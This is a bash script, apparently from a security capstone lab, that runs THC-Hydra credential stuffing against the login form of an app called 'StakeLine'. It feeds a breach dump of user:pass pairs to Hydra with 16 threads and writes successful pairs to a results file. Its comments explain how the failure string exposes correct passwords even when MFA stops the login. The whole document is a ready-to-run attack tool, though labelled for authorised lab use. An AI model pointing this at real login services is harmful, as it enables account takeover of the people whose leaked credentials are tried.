#!/usr/bin/env bash
#
# Hydra credential-stuffing run against the StakeLine login form.
# Equivalent to credential_stuffing.py but using THC-Hydra (v9.4) as in the
# capstone toolchain. The -C flag consumes a colon-separated user:pass dump.
#
# The failure condition (F=) keys on the JSON error the app returns for a bad
# password, so Hydra treats "mfa_required" as a NON-failure — which is exactly
# how you can see, in the enhanced posture, that the password was correct even
# though the login did not fully succeed.
#
# Authorised lab use only.

set -euo pipefail

TARGET_HOST="${1:-127.0.0.1}"
TARGET_PORT="${2:-8080}"
DUMP="${3:-../data/breach_dump.txt}"

echo "[*] hydra credential stuffing -> ${TARGET_HOST}:${TARGET_PORT}"

hydra -C "${DUMP}" \
  -s "${TARGET_PORT}" \
  "${TARGET_HOST}" http-post-form \
  "/login:user=^USER^&pass=^PASS^:F=bad_credentials" \
  -t 16 -o ../data/hydra_results.txt

echo "[*] results written to ../data/hydra_results.txt"
